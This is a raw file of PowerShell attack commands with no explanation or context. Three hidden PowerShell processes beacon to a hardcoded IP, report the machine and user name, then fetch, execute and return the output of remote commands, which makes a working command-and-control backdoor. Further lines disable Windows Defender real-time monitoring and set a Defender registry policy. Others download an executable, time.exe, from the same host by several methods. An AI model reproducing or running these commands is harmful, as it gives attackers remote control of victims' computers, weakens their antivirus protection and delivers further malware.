Start-Process $PSHOME\powershell.exe -ArgumentList {$s='31.166.215.197:45001';$i='f0efbf5c-7b9c693b-d71a9183';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/f0efbf5c/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/7b9c693b -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/d71a9183 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden

Start-Process $PSHOME\powershell.exe -ArgumentList {$s='31.166.215.197:45001';$i='c2e3e1ce-63face78-66c32997';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/c2e3e1ce/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/63face78 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/66c32997 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden

Start-Process $PSHOME\powershell.exe -ArgumentList {$s='31.166.215.197:45001';$i='78a942f8-30d8ee53-67062fab';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/78a942f8/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/30d8ee53 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/67062fab -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden


New-ItemProperty -Path "HKLM:\Software\policies\microsoft\windows defender" -name disableantispyware -value 0 –Force

Set-MpPreference -DisableRealtimeMonitoring $true



$URL = "http://31.166.215.197:45005/time.exe"

$Path=”C:\Files\MyFile.txt”
Invoke-WebRequest -URI $URL -OutFile $Path
(New-Object System.Net.WebClient).DownloadFile ($URL, $Path)
Start-BitsTransfer -Source $URL -Destination $Path


wget 31.166.215.197:45005/time1.exe
curl 31.166.215.197:45005/time.exe
Invoke-WebRequest http://31.166.215.197:45005/time.exe -O time.exe
